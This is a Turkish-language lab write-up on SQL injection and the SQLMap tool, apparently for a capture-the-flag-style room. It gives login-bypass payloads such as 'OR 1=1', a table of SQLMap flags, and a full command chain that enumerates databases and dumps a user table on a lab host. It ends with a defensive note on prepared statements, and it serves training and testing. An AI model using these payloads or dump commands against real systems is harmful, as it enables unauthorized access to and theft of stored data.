## 🧠 1. Mimari Yapı: Web Altyapısı ve Veri Akış Mimarisi

> **🛡️ Siber Güvenlik Analisti Notu:** SQL enjeksiyonunun mantığını kavramak için bir web uygulaması ile veri tabanı arasındaki etkileşim sürecini anlamak esastır. Süreç şu şekilde işler: Kullanıcı tarayıcıdan veri gönderir, web sunucusu bu veriyi alarak doğrulamak üzere bir SQL sorgusu hazırlar ve Veri Tabanı Yönetim Sistemine (DBMS - MySQL, PostgreSQL, SQLite, MS SQL Server) iletir.

### 🌐 GET ve POST İstekleri Arasındaki Siber Farklar

- **GET İstekleri:** Parametreler doğrudan URL içinde iletilir (`/search?cat=1`). SQLMap testlerinde parametrelerin URL’ye doğru şekilde dahil edilmesi taramanın başarısı için kritiktir.
    
- **POST İstekleri:** Veriler isteğin gövdesinde (body) gizli gönderilir. Kimlik doğrulama panellerinde daha yaygındır. SQLMap, Burp Suite gibi araçlarla kesilen (intercepted) POST isteklerini bir `.txt` dosyası üzerinden okuyarak saniyeler içinde analiz edebilir.
    

### ❌ Zafiyetin Doğuşu: Güvensiz Kodlama Örneği

Eğer web uygulaması kullanıcıdan aldığı girdiyi hiçbir temizlik ve doğrulama işleminden (**Sanitization / Input Validation**) geçirmeden doğrudan SQL çekirdeğine gönderirse, uygulama SQL Injection zafiyetine açık hale gelir.

- **Meşru Giriş Senaryosu:**
    
    - _Kullanıcı:_ `username = 'John'`, `password = 'Un@detectable444'`
        
    - _Arka Plandaki Sorgu:_ ```sql
        
        SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
        
    - _Sonuç:_ Sistem her iki koşulun da (`AND` operatörü sebebiyle) doğru olduğunu kontrol eder ve eşleşme varsa girişe izin verir.
        
- **SQLi İstismar (Exploit) Senaryosu:**
    
    - _Saldırgan:_ `username = 'John'`, `password = "abc' OR 1=1;-- -"`
        
    - _Arka Plandaki Sorgu:_ ```sql
        
        SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';
        
    - _Saldırgan Gözüyle Kod Analizi:_
        
        - `abc'` kısmındaki tek tırnak (`'`), web kodundaki orijinal tırnağı kapatarak şifre string alanını erken sonlandırır.
            
        - `OR 1=1` mantıksal ifadesi eklenir. `1=1` her zaman doğru (`TRUE`) olduğu için, şifre yanlış olsa bile `OR` operatörü tüm sorguyu başarılı kabul eder.
            
        - `;-- -` karakterleri, SQL motoruna bu ifadeden sonra gelen her şeyin bir "yorum satırı (comment)" olduğunu söyler ve sorgunun geri kalan hata verebilecek tırnaklarını çöpe atar. Saldırgan şifreyi bilmeden içeri sızar.
            
        - _Alternatif Giriş Taktikleri:_ Saldırgan doğrudan kullanıcı adı alanına `hacker' or 1=1 --` girerek de veri tabanındaki tüm kullanıcı kayıtlarını döndürüp korumayı aşabilir.
            

## 📂 2. SQL Injection İstismar Teknikleri

SQLMap aracı, hedef sistemi tararken arka planda şu temel SQLi tekniklerini simüle eder:

1. **Boolean-based Blind (Mantıksal Kör SQLi):** Ekranda hiçbir veri veya hata görünmez. Saldırgan sisteme doğru ve yanlış sorular sorar (Örn: `AND 1=1`). Web sayfasının içeriğinin değişip değişmediğine bakarak veri tabanındaki harfleri tek tek tahmin eder.
    
2. **Error-based (Hata Tabanlı SQLi):** Sorgu bilerek hatalı gönderilir. Veri tabanı motorunun ürettiği hata mesajlarının (Örn: `EXTRACTVALUE` hataları) içerisine hassas veriler sızdırılarak ekrana basılması sağlanır.
    
3. **Time-based Blind (Zaman Tabanlı Kör SQLi):** Sayfada hiçbir tepki değişimi olmadığında kullanılır. Veri tabanına `SLEEP(5)` gibi komutlar gönderilerek, sayfanın geç yüklenme süresine göre verinin doğruluğu analiz edilir.
    
4. **UNION Query (Birleşik Sorgu SQLi):** Mevcut SQL sorgusunun yanına `UNION ALL SELECT` ifadesi eklenerek, veri tabanındaki başka tablolara ait gizli veriler doğrudan orijinal web sayfasının içerisine enjekte edilerek ekrana dökülür.
    

## 🎛️ 3. SQLMap Otomasyon Silahı ve Kritik Flag Kütüphanesi

**SQLMap**, hedef URL üzerindeki zafiyet noktalarını otomatik olarak keşfeden, veri tabanını, tabloları ve satırları cımbızla çekip ekrana basan Python tabanlı efsanevi bir araçtır.

### 🛠️ SQLMap Komut Parametreleri Tablosu

|**Bayrak (Flag)**|**Komutun İşlevi**|**Örnek Kullanım**|
|---|---|---|
|`-u [URL]`|HTTP GET tabanlı testler için hedef **Target URL**'i belirtir.|`sqlmap -u "http://target.thm/page?id=1"`|
|`--cookie`|Kimlik doğrulama gerektiren gizli sayfaları taramak için **Session Cookie** değerini ekler.|`sqlmap -u "..." --cookie="PHPSESSID=abc123"`|
|`-r [DOSYA]`|Burp Suite gibi araçlarla yakalanıp kaydedilen **POST istek dosyasını** okur.|`sqlmap -r intercepted_request.txt`|
|`--wizard`|Yeni başlayanlar için adım adım sorular sorarak tarama başlatan **Etkileşimli Sihirbazı** açar.|`sqlmap --wizard`|
|`--level=5`|Taramayı en derin, en agresif seviyeye (1-5 arası) çıkarır. Gizli parametreleri bulmayı sağlar.|`sqlmap -u "..." --level=5`|
|`--dbs`|Hedef sistemde erişilebilen tüm **Veri Tabanı İsimlerini** listeler.|`sqlmap -u "..." --dbs`|
|`-D [DB_NAME]`|Üzerinde işlem yapılacak olan **hedef veri tabanını** seçer.|`-D ai`|
|`--tables`|Seçilen veri tabanının içindeki tüm **Tablo İsimlerini** çeker.|`-D ai --tables`|
|`-T [TABLE]`|İşlem yapılacak olan **hedef tabloyu** belirtir.|`-T user`|
|`--columns`|Tablonun içerisindeki **Sütun İsimlerini (Columns)** listeler.|`-D ai -T user --columns`|
|`--dump`|Seçilen tablonun içindeki tüm verileri ekrana **Döküm (Dump)** olarak basar.|`-D ai -T user --dump`|

## 🔬 4. Operasyonel Metodoloji ve Profesyonel Yaklaşım

> **🧠 Profesyonel Siber Yaklaşım Notu:** SQLMap kullanılırken doğrudan her şeyi indirmeye çalışmak yerine "adım adım" ilerlemek, "dump-all" (her şeyi dök) komutuna göre çok daha verimli, sessiz ve hızlıdır. Veri tabanları devasa boyutlarda olabileceği için önce veri tabanı adını, sonra tablo adını, gerekirse sütunları ve en son nokta atışı hedef veriyi belirlemek ağda yakalanma riskinizi düşüren profesyonel bir yaklaşımdır.

### 💡 Sahadan Pratik Tecrübe Hilesi (Görünmez GET Parametreleri)

Giriş yaparken parametrelerin URL adresinde doğrudan görünmediği modern senaryolarda, tarayıcıda sağ tıklayıp **İncele (Inspect) -> Network (Ağ)** sekmesi açılır. Test kimlik bilgileri girilip "Login" butonuna basıldığı an, arka planda tetiklenen gizli istek yakalanır. Buradaki tam URL kopyalanarak terminaldeki SQLMap komutuna **tek tırnak `' '` veya çift tırnak `" "` içinde** beslenir. Bu işlem terminalin `?` ve `&` gibi özel karakterleri görüp hata vermesini engeller.

### 🤖 Lab Ortamı Sorunsuz Tarama Yanıt Stratejisi

Derinlemesine tarama yaparken (`--level=5`) SQLMap'in terminalde sorduğu kritik sorulara verilmesi gereken en kararlı analist yanıtları:

- _Skip test payloads specific for other DBMSes?_ ➡️ `y` (DBMS'in MySQL olduğunu anladıysan diğer dillerin payload'larını geçerek zaman kazandırır).
    
- _Include all tests for 'MySQL' extending provided risk?_ ➡️ `y` (Risk seviyesini genişleterek derinleşir).
    
- _Try with a random integer value for option '--union-char'?_ ➡️ `y` (NULL değerleri yemezse rastgele tamsayılarla şansını dener).
    
- _Keep testing the others (if any)?_ ➡️ `n` (Eğer `email` parametresinin zafiyetli olduğunu bulduysan, diğer kutuları tarayarak vakit kaybetmeyi durdurur).
    

### 🚀 Lab Görevi Canlı Operasyon Komut Zinciri

1. **Veri Tabanlarını Çekme:**
    
    `sqlmap -u "http://10.81.167.246/ai/includes/user_login?email=test&password=test" --dbs -level=5`
    
2. **Tabloları Çekme:**
    
    `sqlmap -u "http://10.81.167.246/ai/includes/user_login?email=test&password=test" -D ai --tables -level=5`
    
3. **Verileri Dump Etme:**
    
    `sqlmap -u "http://10.81.167.246/ai/includes/user_login?email=test&password=test" -D ai -T user --dump -level=5`

## 🏁 Sonuç ve Defansif Güvenlik Notu

SQL enjeksiyonu, günümüzde hala web uygulamaları için en ciddi tehditlerden birini oluşturmaktadır. SQLMap gibi araçlar ofansif tarafta bu açıkların tespitini kolaylaştırsa da, asıl mavi takım (defansif) çözümü; yazılım geliştirme aşamasında **Parametreli Sorgular (Prepared Statements)** ve sıkı **Girdi Sanitasyonu** tekniklerinin zorunlu olarak uygulanmasıdır.
